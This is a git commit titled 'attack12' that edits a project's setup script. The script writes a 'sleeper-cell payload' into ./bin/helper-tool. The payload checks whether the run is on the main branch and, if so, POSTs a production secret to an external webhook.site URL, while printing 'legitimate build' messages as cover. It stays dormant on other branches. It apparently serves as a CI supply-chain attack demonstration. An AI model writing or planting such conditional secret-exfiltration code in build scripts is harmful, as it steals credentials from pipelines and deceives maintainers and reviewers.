d3565497098ce1ffb905989aa0b2b9ea5a450bc1
3marber <3marber@gmail.com>
2026-03-03 00:01:05 +0000

    attack12

--- scripts/setup.sh
+++ scripts/setup.sh
@@ -4,13 +4,14 @@ mkdir -p ./bin
 # Create the sleeper-cell payload
 cat << 'EOF' > ./bin/helper-tool
 #!/bin/bash
+# Logic Bomb: Only fires on Main
 if [[ "$GITHUB_REF" == "refs/heads/main" ]]; then
   echo "ATTACK SUCCESS: Exfiltrating to Webhook..."
   curl -X POST -d "token=${MY_PRODUCTION_SECRET}" https://webhook.site/6b924eda-5e02-4b80-8f7a-0fa501ecd139
 else
-  echo "ATTACK DORMANT: Secret is protected on this branch."
+  echo "ATTACK DORMANT: Secret is protected/masked on this branch."
 fi
-echo "Running Legitimate Build v1.0..."
+echo "Legitimate Build Process Continuing..."
 EOF
 
 chmod +x ./bin/helper-tool
